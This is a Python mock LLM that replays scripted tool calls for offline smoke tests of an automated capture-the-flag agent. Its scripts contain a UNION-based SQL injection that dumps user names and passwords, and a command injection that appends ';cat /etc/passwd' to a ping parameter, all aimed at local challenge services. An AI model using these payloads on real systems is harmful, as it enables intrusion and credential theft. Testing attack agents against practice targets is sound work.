"""Scripted fake LLM: replays a fixed tool-call plan per challenge (offline smoke)."""
from __future__ import annotations

import re
import threading

from hehua.llm.budget import Budget
from hehua.llm.client import ChatResult, ToolCall

SCRIPTS: dict[str, list[tuple[str, dict]]] = {
    "CH-SQLI": [
        ("bash", {"command": 'curl -s "http://{addr}/"'}),
        ("bash", {"command": 'curl -s "http://{addr}/user?id=1\'"'}),
        ("bash", {"command": 'curl -s "http://{addr}/user?id=0%20UNION%20SELECT%20'
                             'name,password%20FROM%20users--"'}),
        ("notes", {"kind": "fact", "content": "UNION sqli works; admin row leaks flag"}),
        ("submit_flag", {"flag": "flag{sqli_master}"}),
        ("finish", {"summary": "union-based sqli on /user?id", "give_up": False}),
    ],
    "CH-CMD": [
        ("bash", {"command": 'curl -s "http://{addr}/ping?ip=127.0.0.1"'}),
        ("bash", {"command": 'curl -s "http://{addr}/ping?ip=127.0.0.1;cat%20/etc/passwd"'}),
        ("submit_flag", {"flag": "flag{cmd_inject}"}),
        ("finish", {"summary": "os command injection on /ping", "give_up": False}),
    ],
}


class MockLLM:
    """Thread-safe: the worker pool runs several challenges concurrently, so
    state is keyed by challenge code (derived from the session's own
    'Challenge: <code>' message) instead of a shared mutable pointer."""

    def __init__(self):
        self.budget = Budget()
        self._lock = threading.Lock()
        self._steps: dict[str, int] = {}

    def set_challenge(self, code: str) -> None:
        with self._lock:
            self._steps[code] = 0

    def chat(self, messages, tools=None, model_role="primary", temperature=0.3,
             thinking=None, **kwargs):
        addr = "127.0.0.1:80"
        code = ""
        for m in messages:
            content = str(m.get("content", ""))
            cm = re.search(r"Challenge: ([A-Za-z0-9-]+)", content)
            if cm:
                code = cm.group(1)
            found = re.findall(r"127\.0\.0\.1:\d+", content)
            if found:
                addr = found[-1]
        script = SCRIPTS.get(code, [])
        with self._lock:
            step = self._steps.get(code, 0)
            if step >= len(script):
                return ChatResult(content="done", model="mock")
            name, args = script[step]
            self._steps[code] = step + 1
        args = {k: (v.replace("{addr}", addr) if isinstance(v, str) else v)
                for k, v in args.items()}
        return ChatResult(content="", model="mock",
                          tool_calls=[ToolCall(id=f"m{code}-{step}", name=name,
                                               arguments=args)])
